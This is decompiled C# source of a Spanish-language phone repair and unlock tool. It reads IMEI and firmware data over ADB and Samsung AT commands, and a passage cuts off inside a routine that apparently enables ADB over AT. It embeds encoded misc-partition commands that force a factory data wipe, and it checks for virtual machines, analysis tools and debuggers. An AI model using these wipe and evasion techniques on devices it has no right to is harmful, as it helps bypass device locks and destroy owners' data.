using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.IO.Ports;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Web;
using System.Windows.Forms;
using HtmlAgilityPack;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using Tstool.My;

namespace Tstool
{
	// Token: 0x0200000E RID: 14
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x17000013 RID: 19
		// (get) Token: 0x0600003A RID: 58 RVA: 0x0000272E File Offset: 0x0000092E
		// (set) Token: 0x0600003B RID: 59 RVA: 0x00002738 File Offset: 0x00000938
		private virtual SerialPort SerialPort1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x0600003C RID: 60 RVA: 0x00002741 File Offset: 0x00000941
		// (set) Token: 0x0600003D RID: 61 RVA: 0x0000274B File Offset: 0x0000094B
		private virtual System.Timers.Timer updateTimer { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x0600003E RID: 62 RVA: 0x00002754 File Offset: 0x00000954
		private async void Form1_Load(object sender, EventArgs e)
		{
			bool flag = !(await this.EsVersionActualizada());
			if (!flag)
			{
				this.AplicarEstilosGlobales();
				this.SetAllButtonsEnabled(false, null);
				if (this.EstaEnMaquinaVirtual())
				{
					MessageBox.Show("⚠️ No se permite ejecutar en entornos virtuales.");
					Application.Exit();
				}
				else if (this.EstaSiendoAnalizado())
				{
					MessageBox.Show("⚠️ Herramientas de análisis detectadas. El programa se cerrará.");
					Application.Exit();
				}
				else if (Debugger.IsAttached)
				{
					MessageBox.Show("❌ No se permite ejecutar en modo depuración.");
					Application.Exit();
				}
				else
				{
					string uid = MySettingsProperty.Settings.FirebaseUid;
					string idToken = MySettingsProperty.Settings.FirebaseIdToken;
					string plan = await FirebasePermissions.ObtenerPlanDelUsuario(uid, idToken);
					if (string.IsNullOrEmpty(plan))
					{
						MessageBox.Show("Usuario no autorizado.");
						this.Close();
					}
					else
					{
						JObject accesos = await FirebasePermissions.ObtenerAccesosDelPlan(plan, idToken);
						if (accesos == null)
						{
							MessageBox.Show("No se pudieron obtener los accesos.");
							this.Close();
						}
						else
						{
							this.UserE.Text = string.Format("User: {0} ({1})", MySettingsProperty.Settings.UserEmail, plan.ToUpper());
							FirebasePermissions.AplicarPermisosDesdeFirebase(this, accesos);
							this.SerialPort1.BaudRate = 9600;
							this.SerialPort1.Parity = Parity.None;
							this.SerialPort1.DataBits = 8;
							this.SerialPort1.StopBits = StopBits.One;
							this.SerialPort1.Handshake = Handshake.None;
							this.SerialPort1.ReadTimeout = 1000;
							this.SerialPort1.WriteTimeout = 1000;
							this.InitializeFastbootTimer();
							this.InitializeControls();
							this.UpdateComPortList();
							this.updateTimer = new System.Timers.Timer(5000.0);
							this.updateTimer.Elapsed += this.OnTimedEvent;
							this.updateTimer.AutoReset = true;
							this.updateTimer.Enabled = true;
							this.UpdateDeviceList();
							this.UserE.Text = string.Format("UserE: {0}", MySettingsProperty.Settings.UserEmail);
							await this.MostrarCreditosActuales();
							string correoAdmin = "yodesbloqueoyreparo@gmail.com";
							string uidAdmin = "qVzqwOOMsBfsf8JNyOtR2lMXgQF2";
							this.btnGestionarCreditos.Visible = (Operators.CompareString(MySettingsProperty.Settings.UserEmail, correoAdmin, false) == 0 && Operators.CompareString(MySettingsProperty.Settings.FirebaseUid, uidAdmin, false) == 0);
							this.AplicarResponsividad();
							this.ResponsividadTotal();
						}
					}
				}
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000279C File Offset: 0x0000099C
		public string GetFileHash(string filePath)
		{
			string result;
			using (SHA256 sha = SHA256.Create())
			{
				using (FileStream fileStream = File.OpenRead(filePath))
				{
					byte[] value = sha.ComputeHash(fileStream);
					result = BitConverter.ToString(value).Replace("-", "").ToLowerInvariant();
				}
			}
			return result;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00002814 File Offset: 0x00000A14
		private void ConfigurarListView()
		{
			ListView listView = this.ListView1;
			listView.View = View.Details;
			listView.FullRowSelect = true;
			listView.GridLines = true;
			listView.Columns.Clear();
			listView.Columns.Add("Firmware", 300);
			listView.Columns.Add("Año", 60);
			listView.Columns.Add("URL", 500);
			listView.Items.Clear();
		}

		// Token: 0x06000041 RID: 65 RVA: 0x0000289C File Offset: 0x00000A9C
		private string GetLoggedInUserInfo()
		{
			string userEmail = MySettingsProperty.Settings.UserEmail;
			bool flag = string.IsNullOrEmpty(userEmail);
			string result;
			if (flag)
			{
				result = "Usuario no logueado";
			}
			else
			{
				result = string.Format("User {0}", userEmail);
			}
			return result;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000028D8 File Offset: 0x00000AD8
		public async Task AplicarPermisosDesdeFirebasePorPlan()
		{
			string uid = MySettingsProperty.Settings.FirebaseUid;
			string idToken = MySettingsProperty.Settings.FirebaseIdToken;
			string plan = await FirebasePermissions.ObtenerPlanDelUsuario(uid, idToken);
			if (string.IsNullOrEmpty(plan))
			{
				MessageBox.Show("⚠ No se pudo obtener el plan del usuario.");
			}
			else
			{
				JObject accesos = await FirebasePermissions.ObtenerAccesosDelPlan(plan, idToken);
				if (accesos == null)
				{
					MessageBox.Show("⚠ No se pudieron obtener los accesos del plan.");
				}
				else
				{
					FirebasePermissions.AplicarPermisosDesdeFirebase(this, accesos);
				}
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x0000291C File Offset: 0x00000B1C
		public Form1()
		{
			base.Load += this.Form1_Load;
			base.FormClosing += this.Form1_FormClosing;
			this.downloading = false;
			this.xmlFilePath = string.Empty;
			this.processRunning = false;
			this.cancelRequested = false;
			this.isUnzipping = false;
			this.SerialPort1 = new SerialPort();
			this.placeholderText = "Buscar marca o modelo...";
			this.verificandoBloqueos = false;
			this.currentFilePath = string.Empty;
			this.processLock = RuntimeHelpers.GetObjectValue(new object());
			this.misc_qualcomm = new byte[]
			{
				98,
				111,
				111,
				116,
				45,
				114,
				101,
				99,
				111,
				118,
				101,
				114,
				121,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				114,
				101,
				99,
				111,
				118,
				101,
				114,
				121,
				10,
				45,
				45,
				102,
				111,
				114,
				109,
				97,
				116,
				95,
				100,
				97,
				116,
				97,
				95,
				98,
				97,
				99,
				107,
				117,
				112,
				10,
				45,
				45,
				114,
				101,
				97,
				115,
				111,
				110,
				61,
				77,
				97,
				115,
				116,
				101,
				114,
				67,
				108,
				101,
				97,
				114,
				67,
				111,
				110,
				102,
				105,
				114,
				109,
				10,
				45,
				45,
				108,
				111,
				99,
				97,
				108,
				101,
				61,
				122,
				104,
				45,
				67,
				78,
				10,
				10,
				0,
				0,
				0,
				0,
				0,
				0
			};
			this.para_mtk = new byte[]
			{
				98,
				111,
				111,
				116,
				45,
				114,
				101,
				99,
				111,
				118,
				101,
				114,
				121,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				114,
				101,
				99,
				111,
				118,
				101,
				114,
				121,
				10,
				45,
				45,
				119,
				105,
				112,
				101,
				95,
				100,
				97,
				116,
				97,
				10,
				45,
				45,
				114,
				101,
				97,
				115,
				111,
				110,
				61,
				77,
				97,
				115,
				116,
				101,
				114,
				67,
				108,
				101,
				97,
				114,
				67,
				111,
				110,
				102,
				105,
				114,
				109,
				10,
				45,
				45,
				108,
				111,
				99,
				97,
				108,
				101,
				61,
				101,
				110,
				95,
				85,
				83,
				10,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0
			};
			this.misc_mtk = new byte[]
			{
				98,
				111,
				111,
				116,
				45,
				114,
				101,
				99,
				111,
				118,
				101,
				114,
				121,
				108,
				111,
				97,
				100,
				101,
				114,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				114,
				101,
				99,
				111,
				118,
				101,
				114,
				121,
				10,
				45,
				45,
				119,
				105,
				112,
				101,
				95,
				100,
				97,
				116,
				97,
				10,
				45,
				45,
				114,
				101,
				97,
				115,
				111,
				110,
				61,
				77,
				97,
				115,
				116,
				101,
				114,
				67,
				108,
				101,
				97,
				114,
				67,
				111,
				110,
				102,
				105,
				114,
				109,
				10,
				45,
				45,
				108,
				111,
				99,
				97,
				108,
				101,
				61,
				101,
				110,
				95,
				85,
				83,
				10,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0
			};
			this.InitializeComponent();
			this.brandsAndModels = new Dictionary<string, List<string>>
			{
				{
					"Apple",
					new List<string>
					{
						"iPhone 11",
						"iPhone 12",
						"iPhone 13"
					}
				},
				{
					"Samsung",
					new List<string>
					{
						"Galaxy S21",
						"Galaxy S20",
						"A23"
					}
				},
				{
					"Huawei",
					new List<string>
					{
						"P30",
						"P40",
						"Mate 40"
					}
				},
				{
					"Xiaomi",
					new List<string>
					{
						"Mi 11",
						"Redmi Note 10",
						"Poco X3"
					}
				}
			};
			this.lstBrands.Items.AddRange(this.brandsAndModels.Keys.ToArray<string>());
			this.SetPlaceholder();
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00002B16 File Offset: 0x00000D16
		private void SetPlaceholder()
		{
			this.txtSearch.Text = this.placeholderText;
			this.txtSearch.ForeColor = Color.Gray;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00002B3C File Offset: 0x00000D3C
		private void txtSearch_GotFocus(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.txtSearch.Text, this.placeholderText, false) == 0;
			if (flag)
			{
				this.txtSearch.Text = "";
				this.txtSearch.ForeColor = Color.Black;
			}
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00002B8C File Offset: 0x00000D8C
		private void txtSearch_LostFocus(object sender, EventArgs e)
		{
			bool flag = string.IsNullOrWhiteSpace(this.txtSearch.Text);
			if (flag)
			{
				this.SetPlaceholder();
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00002BB8 File Offset: 0x00000DB8
		private void txtSearch_TextChanged(object sender, EventArgs e)
		{
			Form1._Closure$__30-0 CS$<>8__locals1 = new Form1._Closure$__30-0(CS$<>8__locals1);
			bool flag = Operators.CompareString(this.txtSearch.Text, this.placeholderText, false) == 0;
			if (!flag)
			{
				CS$<>8__locals1.$VB$Local_searchQuery = this.txtSearch.Text.ToLower();
				Dictionary<string, List<string>> dictionary = new Dictionary<string, List<string>>();
				try
				{
					foreach (KeyValuePair<string, List<string>> keyValuePair in this.brandsAndModels)
					{
						List<string> list = keyValuePair.Value.Where((CS$<>8__locals1.$I0 == null) ? (CS$<>8__locals1.$I0 = ((string model) => model.ToLower().Contains(CS$<>8__locals1.$VB$Local_searchQuery))) : CS$<>8__locals1.$I0).ToList<string>();
						bool flag2 = keyValuePair.Key.ToLower().Contains(CS$<>8__locals1.$VB$Local_searchQuery) || list.Count > 0;
						if (flag2)
						{
							dictionary.Add(keyValuePair.Key, list);
						}
					}
				}
				finally
				{
					Dictionary<string, List<string>>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				this.lstBrands.Items.Clear();
				this.lstBrands.Items.AddRange(dictionary.Keys.ToArray<string>());
				this.lstModels.Items.Clear();
				try
				{
					foreach (KeyValuePair<string, List<string>> keyValuePair2 in dictionary)
					{
						this.lstModels.Items.Add(keyValuePair2.Key + ":");
						this.lstModels.Items.AddRange(keyValuePair2.Value.ToArray());
					}
				}
				finally
				{
					Dictionary<string, List<string>>.Enumerator enumerator2;
					((IDisposable)enumerator2).Dispose();
				}
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00002D8C File Offset: 0x00000F8C
		private void lstBrands_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = this.lstBrands.SelectedItem != null;
			if (flag)
			{
				string key = this.lstBrands.SelectedItem.ToString();
				bool flag2 = this.brandsAndModels.ContainsKey(key);
				if (flag2)
				{
					this.lstModels.Items.Clear();
					this.lstModels.Items.AddRange(this.brandsAndModels[key].ToArray());
				}
			}
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00002E04 File Offset: 0x00001004
		private void btnReadAdb_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.cmbDevicesAdb.SelectedItem != null && Operators.CompareString(this.cmbDevicesAdb.SelectedItem.ToString(), "waiting for devices...", false) != 0;
				if (flag)
				{
					string device = this.cmbDevicesAdb.SelectedItem.ToString();
					string arg = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", device);
					string arg2 = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
					string text = this.ExecuteAdbCommand("shell getprop ro.product.brand", device);
					string text2 = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
					string arg3 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", device);
					string arg4 = this.ExecuteAdbCommand("shell getprop ro.build.version.release", device);
					string arg5 = this.ExecuteAdbCommand("shell getprop ro.boot.bootloader", device);
					string text3 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
					string text4 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
					string arg6 = this.ExecuteAdbCommand("shell getprop ro.hardware", device);
					string text5 = this.ExecuteAdbCommand("shell getprop ro.build.display.id", device);
					string arg7 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
					string arg8 = this.ExecuteAdbCommand("shell getprop ro.boot.rp", device);
					string text6 = this.ExecuteAdbCommand("shell getprop ro.boot.carrierid", device);
					string text7 = this.ExecuteAdbCommand("shell service call iphonesubinfo 1 | grep -o '[0-9a-f]\\{8\\} ' | tail -n+3 | while read a; do echo -n \\\\u${a:4:4}\\\\u${a:0:4}; done", device);
					string arg9 = this.ExecuteAdbCommand("shell getprop ro.boot.carrierid", device);
					this.txtOutput.Clear();
					this.ActualizarProgreso();
					this.txtOutput.AppendText(string.Format("- Connecting ... {0}", arg2));
					this.txtOutput.AppendText(string.Format("Marca: {0}", arg));
					this.txtOutput.AppendText(string.Format("model: {0}", text2));
					this.txtOutput.AppendText(string.Format("SN: {0}", arg2));
					this.txtOutput.AppendText(string.Format("Android: {0}", arg4));
					this.txtOutput.AppendText(string.Format("Security: {0}", arg3));
					this.txtOutput.AppendText(string.Format("Baseband: {0}", arg5));
					this.txtOutput.AppendText(string.Format("SIM: {0}", arg7));
					this.txtOutput.AppendText(string.Format("Hardware: {0}", arg6));
					this.txtOutput.AppendText(string.Format("carrierid: {0}", text6));
					this.txtOutput.AppendText(string.Format("Binario: {0}", arg8));
					this.txtOutput.AppendText(string.Format("carrier: {0}", arg9) + Environment.NewLine);
					this.ActualizarProgreso();
					this.GuardarEnArchivo(text2, this.txtOutput.Text);
					this.TextBox1.Text = "Log guardado en: \\Logs\\" + text2;
					this.ActualizarProgreso();
					string text8 = this.EstaSoportado(text2, text6);
					bool flag2 = !string.IsNullOrEmpty(text8);
					if (flag2)
					{
						this.txtOutput.AppendText(Environment.NewLine + "✅ Este dispositivo está soportado." + Environment.NewLine);
						this.txtOutput.AppendText("ℹ️ " + text8 + Environment.NewLine);
					}
					else
					{
						this.txtOutput.AppendText(Environment.NewLine + "❌ Por el momento no hay más información de soporte." + Environment.NewLine);
					}
					this.ActualizarProgreso();
				}
				else
				{
					MessageBox.Show("Por favor selecciona un dispositivo ADB.");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al leer desde el dispositivo ADB: " + ex.Message);
			}
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00003188 File Offset: 0x00001388
		private string ExecuteAdbCommand(string command, string device)
		{
			Process process = new Process();
			process.StartInfo.FileName = "adb";
			process.StartInfo.Arguments = string.Format("-s {0} {1}", device, command);
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x0000320C File Offset: 0x0000140C
		private List<string> GetAdbDevices()
		{
			Process process = new Process();
			process.StartInfo.FileName = "adb";
			process.StartInfo.Arguments = "devices";
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			string text = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			string[] array = text.Split(new string[]
			{
				Environment.NewLine
			}, StringSplitOptions.RemoveEmptyEntries);
			List<string> list = new List<string>();
			foreach (string text2 in array)
			{
				bool flag = text2.EndsWith("device") && !text2.StartsWith("List of devices");
				if (flag)
				{
					list.Add(text2.Split(new char[0])[0]);
				}
			}
			return list;
		}

		// Token: 0x0600004C RID: 76 RVA: 0x0000330C File Offset: 0x0000150C
		private void UpdateDeviceList()
		{
			List<string> adbDevices = this.GetAdbDevices();
			this.cmbDevicesAdb.Items.Clear();
			bool flag = adbDevices.Count > 0;
			if (flag)
			{
				this.cmbDevicesAdb.Items.AddRange(adbDevices.ToArray());
				this.cmbDevicesAdb.SelectedIndex = 0;
			}
			else
			{
				this.cmbDevicesAdb.Items.Add("waiting for devices...");
				this.cmbDevicesAdb.SelectedIndex = 0;
			}
		}

		// Token: 0x0600004D RID: 77 RVA: 0x0000338B File Offset: 0x0000158B
		private void cmbDevicesAdb_DropDown(object sender, EventArgs e)
		{
			this.UpdateDeviceList();
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00003395 File Offset: 0x00001595
		private void OnTimedEvent(object source, ElapsedEventArgs e)
		{
			base.Invoke(new MethodInvoker(this.UpdateDeviceList));
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000033AC File Offset: 0x000015AC
		private void btnReadComSm_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución.");
			}
			else
			{
				this.UpdateComPortList();
				bool flag2 = this.cmbPuertos.SelectedItem == null || this.cmbPuertos.SelectedItem.ToString().Contains("No hay puertos");
				if (flag2)
				{
					MessageBox.Show("Por favor selecciona un puerto COM válido.");
				}
				else
				{
					this.processRunning = true;
					this.cancelRequested = false;
					this.SetAllButtonsEnabled(false, null);
					this.btnCancelarProceso.Enabled = true;
					this.VerificarEntornoSeguro();
					this.InitializeProgressBar(2);
					Task.Run(delegate()
					{
						try
						{
							string selectedPort = "";
							this.cmbPuertos.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								selectedPort = this.cmbPuertos.SelectedItem.ToString().Split(new char[]
								{
									' '
								})[0];
							}));
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.txtOutput.Clear();
							}));
							string response = this.LeerInformacionSamsungDesdeCOM(selectedPort);
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.ProcessAndDisplayDeviceInfo(response);
								this.ConsultarFirmwaresSamsungDesdeOutput(this.txtOutput);
							}));
						}
						catch (Exception ex)
						{
							MessageBox.Show("Error en lectura COM: " + ex.Message);
						}
						finally
						{
							this.processRunning = false;
							this.AplicarPermisosDesdeFirebasePorPlan();
							this.btnCancelarProceso.Enabled = false;
						}
					});
				}
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00003460 File Offset: 0x00001660
		private string LeerInformacionSamsungDesdeCOM(string puertoCom)
		{
			string result;
			try
			{
				bool isOpen = this.SerialPort1.IsOpen;
				if (isOpen)
				{
					this.SerialPort1.Close();
				}
				this.SerialPort1.PortName = puertoCom;
				this.SerialPort1.BaudRate = 115200;
				this.SerialPort1.Parity = Parity.None;
				this.SerialPort1.DataBits = 8;
				this.SerialPort1.StopBits = StopBits.One;
				this.SerialPort1.Handshake = Handshake.None;
				this.SerialPort1.ReadTimeout = 3000;
				this.SerialPort1.WriteTimeout = 3000;
				this.SerialPort1.Open();
				string text = this.SendAtCommand("AT+DEVCONINFO", 3000);
				this.SerialPort1.Close();
				result = text;
			}
			catch (Exception ex)
			{
				result = "ERROR: " + ex.Message;
			}
			return result;
		}

		// Token: 0x06000051 RID: 81 RVA: 0x0000355C File Offset: 0x0000175C
		private string SendAtCommand(string command, int timeoutMs = 3000)
		{
			string result;
			try
			{
				this.SerialPort1.DiscardInBuffer();
				this.SerialPort1.DiscardOutBuffer();
				this.SerialPort1.Write(command + "\r");
				StringBuilder stringBuilder = new StringBuilder();
				DateTime now = DateTime.Now;
				while ((DateTime.Now - now).TotalMilliseconds < (double)timeoutMs)
				{
					bool flag = this.SerialPort1.BytesToRead > 0;
					if (flag)
					{
						stringBuilder.Append(this.SerialPort1.ReadExisting());
					}
					bool flag2 = stringBuilder.ToString().Contains("OK") || stringBuilder.ToString().Contains("ERROR");
					if (flag2)
					{
						break;
					}
					Thread.Sleep(300);
				}
				string text = this.CleanResponse(stringBuilder.ToString(), command);
				result = text;
			}
			catch (TimeoutException ex)
			{
				result = "Error: Timeout";
			}
			catch (Exception ex2)
			{
				result = "Error: " + ex2.Message;
			}
			return result;
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00003690 File Offset: 0x00001890
		private void ProcessAndDisplayDeviceInfo(string deviceInfo)
		{
			string text = this.ExtractValue(deviceInfo, "MN(", ")");
			string firmwareVer = this.ExtractValue(deviceInfo, "VER(", ")");
			string firmwareVer2 = this.ExtractValue(deviceInfo, "HIDVER(", ")");
			string text2 = this.ExtractValue(deviceInfo, "PRD(", ")");
			string text3 = this.ExtractValue(deviceInfo, "CC(", ")");
			string arg = this.ExtractValue(deviceInfo, "SN(", ")");
			string arg2 = this.ExtractValue(deviceInfo, "IMEI(", ")");
			string arg3 = this.ExtractValue(deviceInfo, "UN(", ")");
			string arg4 = this.ExtractValue(deviceInfo, "CON(", ")");
			Dictionary<string, string> dictionary = this.ParseFirmwareParts(firmwareVer);
			Dictionary<string, string> dictionary2 = this.ParseFirmwareParts(firmwareVer2);
			string arg5 = this.ObtenerBitDesdeCadenaBL(dictionary["BL"]);
			string arg6 = string.Concat(new string[]
			{
				string.Format("model: {0}{1}", text, Environment.NewLine),
				string.Format("Firmware ver: {0}", Environment.NewLine),
				string.Format("BL : {0}{1}", dictionary["BL"], Environment.NewLine),
				string.Format("AP : {0}{1}", dictionary["AP"], Environment.NewLine),
				string.Format("CP : {0}{1}", dictionary["CP"], Environment.NewLine),
				string.Format("CSC : {0}{1}", dictionary["CSC"], Environment.NewLine),
				string.Format("Bit : {0}{1}", arg5, Environment.NewLine),
				string.Format("Hidden ver: {0}", Environment.NewLine),
				string.Format("Baseband : {0}{1}", dictionary2["BL"], Environment.NewLine),
				string.Format("carrierid: {0}{1}", text2, Environment.NewLine),
				string.Format("Serial Number : {0}{1}", arg, Environment.NewLine),
				string.Format("IMEI : {0}{1}", arg2, Environment.NewLine),
				string.Format("Unique Number : {0}{1}", arg3, Environment.NewLine),
				string.Format("PUERTO : {0}", arg4)
			});
			this.TextBox1.Text = string.Format("Model: {0}", text.Trim());
			this.txtOutput.AppendText(string.Format("Datos leídos: {0}{1}{2}", Environment.NewLine, arg6, Environment.NewLine));
			this.GuardarEnArchivo(text, this.txtOutput.Text);
			string text4 = this.EstaSoportado(text, text2);
			bool flag = !string.IsNullOrEmpty(text4);
			if (flag)
			{
				this.txtOutput.AppendText(Environment.NewLine + "✅ Este dispositivo está soportado." + Environment.NewLine);
				this.txtOutput.AppendText("ℹ️ " + text4 + Environment.NewLine);
				this.MostrarOpciones();
			}
			else
			{
				this.txtOutput.AppendText(Environment.NewLine + "❌ Por el momento no hay más información." + Environment.NewLine);
				this.ListView1.Visible = false;
			}
		}

		// Token: 0x06000053 RID: 83 RVA: 0x000039A0 File Offset: 0x00001BA0
		private string ObtenerBitDesdeCadenaBL(string bl)
		{
			bool flag = !string.IsNullOrEmpty(bl) && bl.Length >= 5;
			string result;
			if (flag)
			{
				result = bl.Substring(checked(bl.Length - 5), 1);
			}
			else
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x000039E8 File Offset: 0x00001BE8
		private string ExtractValue(string deviceInfo, string key, string endKey)
		{
			int num = deviceInfo.IndexOf(key);
			bool flag = num == -1;
			checked
			{
				string result;
				if (flag)
				{
					result = "N/A";
				}
				else
				{
					num += key.Length;
					int num2 = deviceInfo.IndexOf(endKey, num);
					bool flag2 = num2 == -1;
					if (flag2)
					{
						result = "N/A";
					}
					else
					{
						result = deviceInfo.Substring(num, num2 - num).Trim();
					}
				}
				return result;
			}
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00003A48 File Offset: 0x00001C48
		private Dictionary<string, string> ParseFirmwareParts(string firmwareVer)
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			string[] array = firmwareVer.Split(new char[]
			{
				'/'
			});
			bool flag = array.Length == 4;
			if (flag)
			{
				dictionary["BL"] = array[0];
				dictionary["AP"] = array[1];
				dictionary["CP"] = array[2];
				dictionary["CSC"] = array[3];
			}
			else
			{
				dictionary["BL"] = "";
				dictionary["AP"] = "";
				dictionary["CP"] = "";
				dictionary["CSC"] = "";
			}
			return dictionary;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00003B04 File Offset: 0x00001D04
		private string CleanResponse(string response, string command)
		{
			response = response.Replace(command, "");
			response = response.Replace("OK", "").Replace("\r", "").Replace("\n", "").Trim();
			return response;
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00003B5C File Offset: 0x00001D5C
		private void UpdateComPortList()
		{
			string[] portNames = SerialPort.GetPortNames();
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			foreach (string text in portNames)
			{
				string portDescription = this.GetPortDescription(text);
				bool flag = !string.IsNullOrEmpty(portDescription) && portDescription.ToLower().Contains("samsung");
				if (flag)
				{
					dictionary[text] = portDescription;
				}
			}
			this.cmbPuertos.Items.Clear();
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in dictionary)
				{
					this.cmbPuertos.Items.Add(string.Format("{0} ({1})", keyValuePair.Key, keyValuePair.Value));
				}
			}
			finally
			{
				Dictionary<string, string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			bool flag2 = this.cmbPuertos.Items.Count > 0;
			if (flag2)
			{
				this.cmbPuertos.SelectedIndex = 0;
			}
			else
			{
				this.cmbPuertos.Items.Add("No hay puertos Samsung disponibles");
				this.cmbPuertos.SelectedIndex = 0;
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00003C98 File Offset: 0x00001E98
		private string GetPortDescription(string port)
		{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Enum"))
				{
					bool flag = registryKey != null;
					if (flag)
					{
						foreach (string name in registryKey.GetSubKeyNames())
						{
							using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
							{
								bool flag2 = registryKey2 != null;
								if (flag2)
								{
									foreach (string name2 in registryKey2.GetSubKeyNames())
									{
										using (RegistryKey registryKey3 = registryKey2.OpenSubKey(name2))
										{
											bool flag3 = registryKey3 != null;
											if (flag3)
											{
												foreach (string name3 in registryKey3.GetSubKeyNames())
												{
													using (RegistryKey registryKey4 = registryKey3.OpenSubKey(name3))
													{
														bool flag4 = registryKey4 != null;
														if (flag4)
														{
															using (RegistryKey registryKey5 = registryKey4.OpenSubKey("Device Parameters"))
															{
																bool flag5 = registryKey5 != null && registryKey5.GetValue("PortName") != null && registryKey5.GetValue("PortName").ToString().Equals(port, StringComparison.OrdinalIgnoreCase);
																if (flag5)
																{
																	string text = registryKey4.GetValue("FriendlyName", "").ToString();
																	bool flag6 = !string.IsNullOrEmpty(text);
																	if (flag6)
																	{
																		return text;
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al obtener la descripción del puerto COM: " + ex.Message);
			}
			return null;
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00003F2C File Offset: 0x0000212C
		private void cmbPuertos_DropDown(object sender, EventArgs e)
		{
			this.UpdateComPortList();
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00003F38 File Offset: 0x00002138
		private async void btnactatadb_Click(object sender, EventArgs e)
		{
			await this.ActivarAtaAdbAsync();
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00003F80 File Offset: 0x00002180
		private async Task ActivarAtaAdbAsync()
		{
			this.UpdateComPortList();
			bool flag = this.processRunning;
			if (flag)
			{
				this.LogOutput("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
